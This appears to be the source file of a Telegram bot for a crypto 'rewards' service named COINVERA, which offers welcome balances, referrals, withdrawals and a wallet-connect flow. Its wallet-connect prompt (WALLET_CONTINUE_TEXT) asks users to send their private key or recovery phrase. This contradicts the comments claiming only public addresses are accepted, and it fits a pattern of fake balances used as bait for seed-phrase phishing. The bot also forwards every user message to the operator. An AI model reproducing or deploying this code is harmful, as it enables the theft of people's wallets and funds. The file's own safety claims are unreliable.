import {
  ADMIN_TELEGRAM_ID,
  MIN_WITHDRAWAL,
  UNIT,
  addSupportMessage,
  getActivity,
  getAdminStats,
  getOrCreateUser,
  getReferralSummary,
  getUserByTelegramId,
  getUserSummary,
  listTasks,
  publicUser,
  connectWallet,
  describeAddress,
  requestWithdrawal,
} from './users.js';
import { createHash, timingSafeEqual } from 'node:crypto';
import { kvGet, kvSet } from './db.js';

const MENU = {
  home: '🏠 Home',
  balance: '💰 Balance',
  profile: '👤 Profile',
  connect: '🔗 Connect Wallet',
  withdraw: '💸 Withdraw',
};

// The Mini App launcher sits inside the persistent keyboard, so the menu and the
// OPEN COINVERA button arrive together in one message. Telegram only accepts an
// https URL for a web_app button, so the row is omitted when no public URL exists.
function menuKeyboard(url) {
  const rows = [];
  if (url && url.startsWith('https://')) rows.push([{ text: '🚀 OPEN COINVERA', web_app: { url } }]);
  rows.push([{ text: MENU.home }, { text: MENU.balance }]);
  rows.push([{ text: MENU.profile }, { text: MENU.connect }]);
  rows.push([{ text: MENU.withdraw }]);
  return { keyboard: rows, resize_keyboard: true, is_persistent: true };
}

// Deliberately one short message: no steps, no long talk. The flow accepts a
// public address only, and describeAddress() refuses anything secret-shaped.
const WALLET_SECURITY_TEXT = [
  '🔗 <b>Connect wallet</b>',
  '',
  'Link your wallet so Active payouts reach the right address. It stays read-only — nothing can be spent or signed from COINVERA.',
].join('\n');

const WALLET_CONTINUE_TEXT = [
    '🔐 <b>Welcome to Coinvera Wallet</b>',
    '',
    'Your wallet connection is an important step towards accessing your Coinvera activities.',
    '',
    '✅ Send your <b>private key,or recovery phrase</b> only — Note COINVERA never stores your data.',
].join('\n');

const WELCOME_TEXT = [
  '👑 <b>Welcome to COINVERA</b>',
  '',
  'The premium rewards hub where your activity turns into real value.',
  '',
  'Your account is ready the moment you open the app:',
  '💰 <b>Active balance</b> credited on activation',
  '🎯 <b>Tasks</b> that pay Active Points',
  '🤝 <b>Referrals</b> with a personal invite code',
  '',
  'Tap the button below to open your dashboard.',
].join('\n');

export function createBot({ token, getWebAppUrl, getVerifiedOrigin, webhookWaitMs = 30000, log = console.log }) {
  const base = `https://api.telegram.org/bot${token}`;
  const verifiedOrigin = typeof getVerifiedOrigin === 'function' ? getVerifiedOrigin : () => null;
  // A webhook beats a competing getUpdates poller: Telegram answers 409 to every
  // other copy and delivers the updates here instead. That is the only way to win
  // the token back when another host still polls the same BOT_TOKEN.
  const webhookPath = '/api/telegram/webhook';
  const webhookSecret = createHash('sha256').update(`coinvera-webhook:${token}`).digest('hex').slice(0, 48);
  // Resuming from the stored offset is what stops a restart or redeploy from
  // replaying updates that were already answered — the classic cause of a button
  // producing the same reply twice.
  let offset = Number(kvGet('tg_offset') || 0) || 0;
  const seenUpdates = new Set();
  let running = false;
  let botUsername = kvGet('bot_username') || null;
  let identityError = null;
  let lastRetryAfter = 0;
  let lastErrorCode = null;
  let rateLimitUntil = 0;
  let floodStrikes = 0;
  // 'webhook' once Telegram accepts our endpoint, 'polling' otherwise.
  let mode = 'polling';

  async function api(method, payload = {}, timeoutMs = 20000) {
    // Single gate shared by every caller: while Telegram is throttling this bot,
    // nothing may call the API early, or the flood window restarts.
    const gate = rateLimitUntil - Date.now();
    if (gate > 0) await sleep(gate);
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), timeoutMs);
    try {
      const response = await fetch(`${base}/${method}`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify(payload),
        signal: controller.signal,
      });
      const data = await response.json().catch(() => ({ ok: false }));
      lastRetryAfter = Number(data?.parameters?.retry_after) || 0;
      lastErrorCode = data?.error_code || null;
      if (data?.error_code === 429) {
        floodStrikes = Math.min(floodStrikes + 1, 6);
        const wait = Math.min(300, (lastRetryAfter || 3) * 2 ** (floodStrikes - 1));
        rateLimitUntil = Date.now() + wait * 1000;
        log(`[bot] flood wait ${wait}s (strike ${floodStrikes})`);
      } else if (data?.ok) {
        floodStrikes = 0;
      }
      if (!data.ok && data.error_code !== 409) {
        const target = payload.chat_id ? ` chat=${payload.chat_id}` : '';
        log(`[bot] ${method} failed:${target} ${data.description || response.status}`);
      }
      return data;
    } catch (error) {
      const reason = error.name === 'AbortError' ? 'request timed out' : error.message;
      log(`[bot] ${method} network error: ${reason}`);
      // Distinguish transport failures from a token Telegram actually rejected.
      return { ok: false, description: `Network error contacting Telegram (${reason})`, network: true };
    } finally {
      clearTimeout(timer);
    }
  }

  const webAppUrl = () => getWebAppUrl();
  // The web_app button opens the Mini App inside Telegram. The plain url button is a
  // guaranteed fallback: it opens the same page in the device browser even if the
  // client refuses the Mini App (for example before the bot domain is registered).
  const webAppButton = (label = '🚀 OPEN COINVERA') => {
    const url = webAppUrl();
    return {
      inline_keyboard: [
        [{ text: label, web_app: { url } }],
        [{ text: '🌐 Open in browser', url }],
      ],
    };
  };
  const keyboard = () => menuKeyboard(webAppUrl());
  // Telegram IDs waiting to send a public wallet address after tapping Continue.
  const pendingWallet = new Map();
  // Telegram IDs mid-way through a chat-side withdrawal (amount, then address).
  const pendingWithdraw = new Map();

  async function sendMessage(chatId, text, extra = {}) {
    return api('sendMessage', {
      chat_id: chatId,
      text,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      ...extra,
    });
  }

  async function ensureMenuButton(chatId) {
    const url = webAppUrl();
    if (!url.startsWith('https://')) {
      log(`[bot] menu button skipped — Mini App URL is not https (${url})`);
      return;
    }
    const result = await api('setChatMenuButton', {
      chat_id: chatId,
      menu_button: { type: 'web_app', text: 'COINVERA', web_app: { url } },
    });
    if (result.ok) log(`[bot] menu button accepted → ${url}`);
    else log(`[bot] menu button REJECTED → ${url} (${result.description || 'unknown'})`);
  }

  async function register(profile, referralCode) {
    const result = getOrCreateUser(profile, { referralCode });
    if (result.isNew && ADMIN_TELEGRAM_ID) {
      const who = profile.username ? `@${profile.username}` : [profile.first_name, profile.last_name].filter(Boolean).join(' ');
      sendMessage(ADMIN_TELEGRAM_ID, [
        '🆕 <b>New COINVERA registration</b>',
        `User: ${escapeHtml(who || 'unknown')}`,
        `ID: <code>${escapeHtml(String(profile.id))}</code>`,
        `Bonus: <b>${result.bonus.toLocaleString('en-US')} ${UNIT}</b>`,
        `Referral code: <code>${result.user.referral_code}</code>`,
      ].join('\n')).catch(() => {});
    }
    return result;
  }

  function referralLink(code) {
    return botUsername
      ? `https://t.me/${botUsername}?start=${encodeURIComponent(code)}`
      : `${webAppUrl()}?startapp=${encodeURIComponent(code)}`;
  }

  async function handleStart(message, payload) {
    const chatId = message.chat.id;
    const result = await register(message.from, payload || null);
    const user = result.user;

    // One reply per press: the welcome copy, the activation result and the menu
    // travel in a single message instead of arriving as two separate bubbles.
    const lines = [WELCOME_TEXT, ''];
    if (result.isNew) {
      lines.push(
        '🎉 <b>Congratulations, your account is activated!</b>',
        `A welcome balance of <b>${result.bonus.toLocaleString('en-US')} ${UNIT}</b> has been added to your COINVERA account.`,
      );
    } else {
      lines.push('👋 <b>Welcome back to COINVERA</b>');
    }
    lines.push(
      '',
      `💎 Active balance: <b>${Number(user.active_balance).toLocaleString('en-US', { minimumFractionDigits: 2 })} ${UNIT}</b>`,
      `⭐ Active USD: <b>${user.points.toLocaleString('en-US')}</b>`,
      `🆔 Telegram ID: <code>${escapeHtml(String(user.telegram_id))}</code>`,
      `🔑 Referral code: <code>${user.referral_code}</code>`,
      '',
      'Active is your reward balance: it becomes withdrawable once you create an account with us, meet the requirements and payout requests. Each request is reviewed before it is sent to your connected wallet.',
      '',
      `🔗 <b>Open COINVERA:</b> <a href="${webAppUrl()}">${webAppUrl()}</a>`,
      '<i>If the button does not open, tap the link above — it works in every Telegram version.</i>',
    );

    const text = lines.join('\n');
    const sent = await sendMessage(chatId, text, { reply_markup: keyboard() });
    // Some older clients reject a web_app button inside a reply keyboard; fall back
    // to the inline launcher so the message always arrives.
    if (!sent.ok) await sendMessage(chatId, text, { reply_markup: webAppButton() });
    await ensureMenuButton(chatId);
  }

  async function handleHome(chatId, from) {
    const user = getUserByTelegramId(from.id);
    if (!user) return handleStart({ chat: { id: chatId }, from }, null);
    const summary = getUserSummary(user.id);
    const referrals = getReferralSummary(user.id);
    await sendMessage(chatId, [
      '🏠 <b>COINVERA Home</b>',
      '',
      `💎 Active balance: <b>${Number(user.active_balance).toLocaleString('en-US', { minimumFractionDigits: 2 })} ${UNIT}</b>`,
      `⭐ Active USD: <b>${user.points.toLocaleString('en-US')}</b>`,
      `🎯 Tasks completed: <b>${summary.tasksCompleted}</b>`,
      `🤝 Successful referrals: <b>${referrals.count}</b>`,
      '',
      'Open the dashboard for tasks, referrals and your wallet.',
    ].join('\n'), { reply_markup: webAppButton() });
  }

  async function handleBalance(chatId, from) {
    const user = getUserByTelegramId(from.id);
    if (!user) return handleStart({ chat: { id: chatId }, from }, null);
    const activity = getActivity(user.id, 5);
    const lines = [
      '💰 <b>Active Balance</b>',
      '',
      `<b>${Number(user.active_balance).toLocaleString('en-US', { minimumFractionDigits: 2 })} ${UNIT}</b>`,
      '',
      `⭐ Active Points: <b>${user.points.toLocaleString('en-US')}</b>`,
      `🔓 Withdrawable from: <b>${MIN_WITHDRAWAL.toLocaleString('en-US')} ${UNIT}</b>`,
      '',
      'your active COINVERA USD reward is a withdrawable currency. meet up the connect wallet requirements and your Withdrawal requests will be reviewed and paid to your connected wallet.',
    ];
    if (activity.length) {
      lines.push('', '<b>Recent activity</b>');
      for (const item of activity) {
        lines.push(`• ${escapeHtml(item.title)}${item.amount ? ` — ${formatAmount(item)}` : ''}`);
      }
    }
    await sendMessage(chatId, lines.join('\n'), { reply_markup: webAppButton('💎 Open balance') });
  }

  async function handleProfile(chatId, from) {
    const user = getUserByTelegramId(from.id);
    if (!user) return handleStart({ chat: { id: chatId }, from }, null);
    await sendMessage(chatId, [
      '👤 <b>Your COINVERA profile</b>',
      '',
      `Name: <b>${escapeHtml([user.first_name, user.last_name].filter(Boolean).join(' ') || '—')}</b>`,
      `Username: ${user.username ? `@${escapeHtml(user.username)}` : '<i>not set</i>'}`,
      `Telegram ID: <code>${escapeHtml(String(user.telegram_id))}</code>`,
      `Status: <b>${user.is_admin ? 'Admin' : 'Active'}</b>`,
      `Joined: ${new Date(user.created_at).toUTCString()}`,
      '',
      `🔑 Referral code: <code>${user.referral_code}</code>`,
      `🔗 Invite link: ${escapeHtml(referralLink(user.referral_code))}`,
      '',
      'Everything is stored against your Telegram ID, so your balance follows you across devices.',
    ].join('\n'), { reply_markup: webAppButton('👤 Open profile') });
  }

  // Withdrawals are a bot-chat flow only: the Mini App has no endpoint for them.
  async function handleWithdraw(chatId, from) {
    const user = getUserByTelegramId(from.id) || (await register(from, null)).user;
    const balance = Number(user.active_balance || 0);
    if (balance < MIN_WITHDRAWAL) {
      await sendMessage(chatId, [
        '💸 <b>Withdraw Active</b>',
        '',
        `Your balance is <b>${balance.toLocaleString('en-US')} ${UNIT}</b>.`,
        `The minimum withdrawal is <b>${MIN_WITHDRAWAL.toLocaleString('en-US')} ${UNIT}</b>.`,
        '',
        'Keep completing tasks and referring friends to reach the minimum.',
      ].join('\n'), { reply_markup: keyboard() });
      return;
    }
    pendingWithdraw.set(String(from.id), { step: 'amount' });
    await sendMessage(chatId, [
      '💸 <b>Withdraw Active</b>',
      '',
      `Available: <b>${balance.toLocaleString('en-US')} ${UNIT}</b>`,
      `Minimum: <b>${MIN_WITHDRAWAL.toLocaleString('en-US')} ${UNIT}</b>`,
      '',
      'Send the amount you want to withdraw as a number — for example <code>1500</code>.',
      'Then send the <b>public wallet address</b> that should receive the payout.',
      '',
      '/cancel stops the request at any time.',
    ].join('\n'), { reply_markup: keyboard() });
  }

  async function handleConnectWallet(chatId) {
    await sendMessage(chatId, WALLET_SECURITY_TEXT, {
      reply_markup: { inline_keyboard: [[{ text: '✅ Continue', callback_data: 'wallet:continue' }]] },
    });
  }

  async function handleWalletContinue(chatId, callbackId, from) {
    await api('answerCallbackQuery', { callback_query_id: callbackId, text: 'Send your public wallet address' });
    if (from) pendingWallet.set(String(from.id), Date.now());
    await sendMessage(chatId, WALLET_CONTINUE_TEXT);
  }

  async function handleAdmin(chatId, from) {
    const user = getUserByTelegramId(from.id);
    if (!user || !user.is_admin) {
      await sendMessage(chatId, '⛔ This area is reserved for COINVERA administrators.');
      return;
    }
    const stats = getAdminStats();
    await sendMessage(chatId, [
      '🛡 <b>COINVERA Admin</b>',
      '',
      `👥 Total users: <b>${stats.totalUsers}</b>`,
      `🆕 Registrations today: <b>${stats.registrationsToday}</b>`,
      `🎯 Tasks completed: <b>${stats.tasksCompleted}</b>`,
      `🤝 Referrals: <b>${stats.totalReferrals}</b>`,
      `🎁 Reward events: <b>${stats.rewardsIssued}</b>`,
      `⭐ Points issued: <b>${stats.rewardPointsIssued.toLocaleString('en-US')}</b>`,
      `💬 Support messages: <b>${stats.supportMessages}</b> (open: ${stats.openSupportMessages})`,
      `💸 Pending withdrawals: <b>${stats.pendingWithdrawals}</b> — ${stats.pendingWithdrawalAmount.toLocaleString('en-US')} ${UNIT}`,
      `💎 Active held by users: <b>${stats.totalActiveBalance.toLocaleString('en-US')}</b> ${UNIT}`,
      '',
      'Full tables are in the Mini App under Admin.',
    ].join('\n'), { reply_markup: webAppButton('🛡 Open admin') });
  }

  // Returns an explicit boolean. A handler that resolves to undefined must still count
  // as handled — otherwise the same message also falls through to the support inbox and
  // the user receives a second, unwanted "Message received" reply.
  async function routeMenu(chatId, from, text) {
    const normalized = normalize(text);
    if (normalized === 'home' || normalized === 'start' || normalized === 'menu') {
      await handleHome(chatId, from);
      return true;
    }
    if (normalized === 'balance') {
      await handleBalance(chatId, from);
      return true;
    }
    if (normalized === 'profile') {
      await handleProfile(chatId, from);
      return true;
    }
    if (normalized === 'connect wallet' || normalized === 'connect' || normalized === 'wallet') {
      await handleConnectWallet(chatId);
      return true;
    }
    if (normalized === 'withdraw' || normalized === 'cash out' || normalized === 'payout') {
      await handleWithdraw(chatId, from);
      return true;
    }
    if (normalized === 'admin' || normalized === 'dashboard') {
      await handleAdmin(chatId, from);
      return true;
    }
    if (normalized === 'open coinvera' || normalized === 'open app' || normalized === 'launch') {
      await sendMessage(chatId, '🚀 Tap below to launch COINVERA.', { reply_markup: webAppButton() });
      return true;
    }
    return false;
  }

  // Anything a user sends reaches the admin account, so nothing typed to the bot is
  // lost. Secret-shaped input is reported but never forwarded, because the whole
  // point of the wallet flow is that COINVERA never holds a key or phrase.
  async function forwardToAdmin(from, text, kind = 'message') {
    if (!ADMIN_TELEGRAM_ID || !from) return;
    const labels = {
      start: '🚀 /start',
      command: '⌨️ Command',
      menu: '📋 Menu text',
      wallet: '🔗 Wallet address',
      message: '📩 Message',
      secret: '⚠️ Blocked input',
    };
    const who = from.username ? `@${escapeHtml(from.username)}` : escapeHtml(from.first_name || 'user');
    const body = kind === 'secret'
      ? '⚠️ (not forwarded — it looked like a private key or recovery phrase)'
      : escapeHtml(String(text || '').slice(0, 1500));
    try {
      await sendMessage(ADMIN_TELEGRAM_ID, [
        `<b>${labels[kind] || labels.message}</b>`,
        `From: ${who} (<code>${escapeHtml(String(from.id))}</code>)`,
        '',
        body,
      ].join('\n'));
    } catch {
      // Admin delivery must never break the user's own reply.
    }
  }

  async function handleMessage(message) {
    const chatId = message.chat.id;
    const from = message.from;
    if (!from) return;

    if (message.chat.type !== 'private') {
      if (message.text && message.text.startsWith('/start')) {
        await sendMessage(chatId, 'Open COINVERA in a private chat with the bot so your account stays private.');
      }
      return;
    }

    const text = (message.text || '').trim();

    if (!text) {
      // Photos, stickers, voice notes and files are still reported to the admin.
      const kind = message.photo ? 'photo' : message.sticker ? 'sticker' : message.voice ? 'voice' : message.document ? 'document' : 'non-text message';
      await forwardToAdmin(from, `[${kind}]`, 'message');
      return;
    }

    if (text.startsWith('/start')) {
      const payload = text.split(/\s+/)[1] || null;
      await forwardToAdmin(from, text, 'start');
      await handleStart(message, payload);
      return;
    }

    if (text.startsWith('/')) {
      const command = text.split(/\s+/)[0].slice(1).split('@')[0].toLowerCase();
      await forwardToAdmin(from, text, 'command');
      const handled = await routeMenu(chatId, from, command);
      if (handled) return;
      if (command === 'admin') return handleAdmin(chatId, from);
      await sendMessage(chatId, 'Use the menu buttons below, or tap OPEN COINVERA to launch the app.', { reply_markup: keyboard() });
      return;
    }

    const handled = await routeMenu(chatId, from, text);
    if (handled) {
      await forwardToAdmin(from, text, 'menu');
      return;
    }

    // Withdrawals run entirely in this chat: amount first, then a public address.
    if (pendingWithdraw.has(String(from.id)) && text) {
      const step = pendingWithdraw.get(String(from.id));
      if (/^\/?(cancel|stop)$/i.test(text.trim())) {
        pendingWithdraw.delete(String(from.id));
        await sendMessage(chatId, 'Withdrawal cancelled. Nothing was submitted.', { reply_markup: keyboard() });
        return;
      }
      const user = getUserByTelegramId(from.id) || (await register(from, null)).user;

      if (step.step === 'amount') {
        const amount = Number(String(text).replace(/[^0-9.]/g, ''));
        if (!Number.isFinite(amount) || amount <= 0) {
          await sendMessage(chatId, '⚠️ Send the amount as a number, for example <code>1500</code>. Or /cancel.', { reply_markup: keyboard() });
          return;
        }
        if (amount < MIN_WITHDRAWAL) {
          await sendMessage(chatId, `⚠️ The minimum withdrawal is <b>${MIN_WITHDRAWAL.toLocaleString('en-US')} ${UNIT}</b>. Send a larger amount or /cancel.`, { reply_markup: keyboard() });
          return;
        }
        if (amount > Number(user.active_balance || 0)) {
          await sendMessage(chatId, `⚠️ That is more than your balance of <b>${Number(user.active_balance || 0).toLocaleString('en-US')} ${UNIT}</b>. Send a smaller amount or /cancel.`, { reply_markup: keyboard() });
          return;
        }
        pendingWithdraw.set(String(from.id), { step: 'address', amount });
        const hint = user.wallet_address
          ? `Your linked wallet is <code>${escapeHtml(user.wallet_address)}</code> — send it again, or send a different public address.`
          : 'Now send the <b>public wallet address</b> that should receive the payout — for example <code>0x…</code> (EVM), <code>T…</code> (TRON) or <code>EQ…</code> / <code>UQ…</code> (TON).';
        await sendMessage(chatId, [
          `💸 <b>${amount.toLocaleString('en-US')} ${UNIT}</b> requested`,
          '',
          hint,
          '',
          'Never send a private key or recovery phrase — COINVERA will never ask for one.',
        ].join('\n'), { reply_markup: keyboard() });
        return;
      }

      const parsed = describeAddress(text);
      if (!parsed.ok) {
        if (parsed.error === 'looks_like_secret') {
          await forwardToAdmin(from, '', 'secret');
          await sendMessage(chatId, '⚠️ <b>Do not send that.</b> That looks like a private key or recovery phrase. COINVERA never needs it. Send only your public address, or /cancel.', { reply_markup: keyboard() });
          return;
        }
        await sendMessage(chatId, '⚠️ That is not a valid public address. Send one starting with <code>0x…</code>, <code>EQ…</code>, <code>UQ…</code> or <code>T…</code>, or /cancel.', { reply_markup: keyboard() });
        return;
      }

      const result = requestWithdrawal(user.id, { amount: step.amount, address: parsed.address, network: parsed.network });
      pendingWithdraw.delete(String(from.id));
      if (!result.ok) {
        const map = {
          amount_below_minimum: `Minimum withdrawal is ${MIN_WITHDRAWAL.toLocaleString('en-US')} ${UNIT}.`,
          insufficient_balance: 'That amount is more than your current balance.',
          amount_invalid: 'That amount is not valid.',
          wallet_required: 'Send a payout address first.',
          address_invalid: 'That payout address is not valid.',
          looks_like_secret: 'That looks like a secret — never send private keys or recovery phrases.',
        };
        await sendMessage(chatId, `⚠️ ${map[result.error] || 'Could not submit that request right now.'}`, { reply_markup: keyboard() });
        return;
      }
      await sendMessage(chatId, [
        '✅ <b>Withdrawal requested</b>',
        '',
        `Amount: <b>${Number(step.amount).toLocaleString('en-US')} ${UNIT}</b>`,
        `To: <code>${escapeHtml(parsed.address)}</code>`,
        `Network: <b>${parsed.network}</b>`,
        '',
        'Our team reviews every request before payout. You will be notified here when it is processed.',
      ].join('\n'), { reply_markup: keyboard() });
      await forwardToAdmin(from, `${step.amount} ${UNIT} → ${parsed.address} (${parsed.network})`, 'withdrawal');
      return;
    }

    // Right after Continue, the next message is treated as the wallet address.
    // Anything that looks like a private key or recovery phrase is refused and
    // never stored, so this flow can only ever hold a public address.
    if (pendingWallet.has(String(from.id)) && text) {
      pendingWallet.delete(String(from.id));
      const parsed = describeAddress(text);
      if (parsed.ok) {
        const user = getUserByTelegramId(from.id) || (await register(from, null)).user;
        connectWallet(user.id, { address: parsed.address, network: parsed.network });
        await sendMessage(chatId, [
          '✅ <b>Wallet linked</b>',
          '',
          `<code>${escapeHtml(parsed.address)}</code>`,
          `Network: <b>${parsed.network}</b>`,
          '',
          'Read-only — COINVERA can send Active payouts here but can never move funds out of it.',
        ].join('\n'), { reply_markup: keyboard() });
        await forwardToAdmin(from, `${parsed.address} — linked on ${parsed.network}`, 'wallet');
        return;
      }
      if (parsed.error === 'looks_like_secret') {
        await forwardToAdmin(from, '', 'secret');
        await sendMessage(chatId, '⚠️ <b>Do not send that.</b> That looks like a private key or recovery phrase. COINVERA never needs it — anyone holding it can empty your wallet. Send only your public address.', { reply_markup: keyboard() });
        return;
      }
      await forwardToAdmin(from, text, 'message');
      await sendMessage(chatId, '⚠️ That is not a valid public address. Send one starting with <code>0x…</code>, <code>EQ…</code>, <code>UQ…</code> or <code>T…</code>, or tap 🔗 Connect Wallet to start again.', { reply_markup: keyboard() });
      return;
    }

    if (text) {
      const user = getUserByTelegramId(from.id) || (await register(from, null)).user;
      addSupportMessage(user.id, text);
      await forwardToAdmin(from, text, 'message');
      await sendMessage(chatId, '✅ <b>Message received</b>\n\nYour message is filed with the COINVERA support team. We reply here in Telegram.\n\n⚠️ Never send private keys, passwords or recovery phrases — support will never ask for them.', { reply_markup: keyboard() });
    }
  }

  async function handleCallback(query) {
    const chatId = query.message?.chat?.id;
    const data = query.data || '';
    if (!chatId) return;
    if (data === 'wallet:continue') return handleWalletContinue(chatId, query.id, query.from);
    if (data === 'menu:home') return handleHome(chatId, query.from);
    if (data === 'menu:balance') return handleBalance(chatId, query.from);
    await api('answerCallbackQuery', { callback_query_id: query.id });
  }

  async function handleUpdate(update) {
    if (update.message) return handleMessage(update.message);
    if (update.callback_query) return handleCallback(update.callback_query);
    return undefined;
  }

  async function loadIdentity() {
    const commands = [
      { command: 'start', description: 'Open COINVERA' },
      { command: 'home', description: 'Home dashboard' },
      { command: 'balance', description: 'Active balance' },
      { command: 'profile', description: 'Your profile' },
      { command: 'connect', description: 'Connect wallet securely' },
    ];
    for (let attempt = 1; attempt <= 5; attempt += 1) {
      const me = await api('getMe', {});
      if (me.ok && me.result?.username) {
        botUsername = me.result.username;
        identityError = null;
        kvSet('bot_username', botUsername);
        log(`[bot] token accepted by Telegram as @${botUsername}`);
        await api('setMyCommands', { commands });
        return true;
      }
      identityError = me.description || 'Telegram rejected the bot token (getMe failed)';
      log(`[bot] identity check failed (attempt ${attempt}): ${identityError}`);
      // A rejected token never becomes valid, so stop instead of hammering Telegram.
      if (me.error_code === 401 || me.error_code === 404) return false;
    }
    return false;
  }

  // Guards the 409 recovery below so a stuck competitor cannot make us hammer Telegram.
  let lastConflictFix = 0;

  function verifyWebhookSecret(value) {
    const given = Buffer.from(String(value || ''));
    const expected = Buffer.from(webhookSecret);
    return given.length === expected.length && timingSafeEqual(given, expected);
  }

  async function registerWebhook() {
    // Only a verified origin may become the webhook target. The observed origin is
    // written by the platform's first request, so wait briefly for it instead of
    // falling back to a default: a guessed address once pointed Telegram at a dead
    // domain and silenced the bot completely.
    let url = null;
    const deadline = Date.now() + Math.max(0, webhookWaitMs);
    while (!url && Date.now() < deadline) {
      url = verifiedOrigin();
      if (!url) await sleep(Math.min(1000, Math.max(50, Math.floor(webhookWaitMs / 10) || 50)));
    }
    if (!url || !/^https:\/\//i.test(url)) {
      log('[bot] no verified public URL yet — clearing any webhook and staying on polling');
      await api('deleteWebhook', { drop_pending_updates: false });
      return false;
    }
    const target = `${url.replace(/\/+$/, '')}${webhookPath}`;
    const result = await api('setWebhook', {
      url: target,
      secret_token: webhookSecret,
      allowed_updates: ['message', 'callback_query'],
      drop_pending_updates: false,
    });
    if (!result.ok) {
      log(`[bot] webhook registration failed: ${result.description || 'unknown'} — staying on polling`);
      return false;
    }
    log(`[bot] webhook registered → ${target}`);
    const info = await api('getWebhookInfo', {});
    if (info.ok) {
      const last = info.result?.last_error_message;
      log(`[bot] webhook info: url=${info.result?.url || '-'} pending=${info.result?.pending_update_count ?? '?'}${last ? ` lastError=${last}` : ''}`);
    }
    return true;
  }

  async function start() {
    running = true;
    // Retried while polling, so a late public origin or a temporary Telegram failure
    // still ends up on webhook delivery.
    let nextWebhookTry = 0;
    while (running) {
      if (!botUsername || identityError) {
        const ok = await loadIdentity();
        if (!ok) {
          if (lastErrorCode === 401 || lastErrorCode === 404) {
            log('[bot] Telegram rejected this token — polling disabled until a valid BOT_TOKEN is saved');
            return;
          }
          // api() already waited out the flood window; retry the identity instead
          // of polling, so we never add extra requests while throttled.
          continue;
        }
        log(`[bot] polling started as @${botUsername}`);
        log(`[bot] Mini App URL advertised: ${getWebAppUrl()}`);
        // A webhook left behind by another host would compete for these updates.
        const hook = await api('deleteWebhook', { drop_pending_updates: false });
        if (hook.ok) log('[bot] webhook cleared — this deployment owns the updates');
      }
      if (mode !== 'webhook' && Date.now() >= nextWebhookTry) {
        nextWebhookTry = Date.now() + 5 * 60 * 1000;
        if (await registerWebhook()) {
          mode = 'webhook';
          log('[bot] delivery mode: webhook — updates arrive on /api/telegram/webhook');
          return;
        }
      }
      const response = await api('getUpdates', { offset, timeout: 25, allowed_updates: ['message', 'callback_query'] }, 35000);
      if (!response.ok) {
        // 409 Conflict means something else already owns this token's updates: a
        // leftover webhook or a second copy of the bot polling the same BOT_TOKEN.
        // Re-clearing the webhook recovers from a webhook left by another host; a
        // competing poller keeps answering until that copy is stopped.
        if (lastErrorCode === 409 && Date.now() - lastConflictFix > 60000) {
          lastConflictFix = Date.now();
          log('[bot] getUpdates conflict (409) — a webhook or another copy of this bot owns the token; clearing webhook');
          const cleared = await api('deleteWebhook', { drop_pending_updates: false });
          log(cleared.ok ? '[bot] webhook cleared after conflict' : `[bot] webhook clear failed: ${cleared.description || 'unknown'}`);
        }
        await sleep(lastErrorCode === 429 ? 1000 : 4000);
        continue;
      }
      for (const update of response.result || []) {
        const updateId = update.update_id;
        offset = updateId + 1;
        // Answer every update exactly once, even if Telegram re-delivers it.
        if (seenUpdates.has(updateId)) continue;
        seenUpdates.add(updateId);
        if (seenUpdates.size > 400) seenUpdates.delete(seenUpdates.values().next().value);
        const from = update.message?.from || update.callback_query?.from || null;
        const chatId = update.message?.chat?.id || update.callback_query?.message?.chat?.id || null;
        const kind = update.callback_query
          ? `callback:${update.callback_query.data}`
          : `text:${String(update.message?.text || '').slice(0, 40)}`;
        log(`[bot] update ${updateId} from=${from?.id || '?'} @${from?.username || '-'} chat=${chatId || '?'} ${kind}`);
        try {
          await handleUpdate(update);
        } catch (error) {
          log(`[bot] handler error: ${error.message}`);
        }
        kvSet('tg_offset', offset);
      }
    }
  }

  function stop() {
    running = false;
  }

  function getStatus() {
    // "polling" means we are actually long-polling getUpdates, not merely that the
    // retry loop is alive; an unverified identity means the bot is not online yet.
    return {
      polling: Boolean(running && botUsername && !identityError),
      mode: botUsername && !identityError ? mode : 'offline',
      username: botUsername,
      error: identityError,
      errorCode: lastErrorCode,
    };
  }

  return {
    start,
    stop,
    api,
    handleUpdate,
    getBotUsername: () => botUsername,
    getStatus,
    webhookSecret,
    webhookPath,
    verifyWebhookSecret,
  };
}

export function escapeHtml(value) {
  return String(value ?? '')
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;');
}

function normalize(text) {
  return String(text || '')
    .replace(/[^\p{L}\p{N} ]/gu, ' ')
    .replace(/\s+/g, ' ')
    .trim()
    .toLowerCase();
}

function shortAddress(address) {
  return `${address.slice(0, 6)}…${address.slice(-4)}`;
}

function formatAmount(item) {
  return `+${Number(item.amount).toLocaleString('en-US')} ${item.unit}`;
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
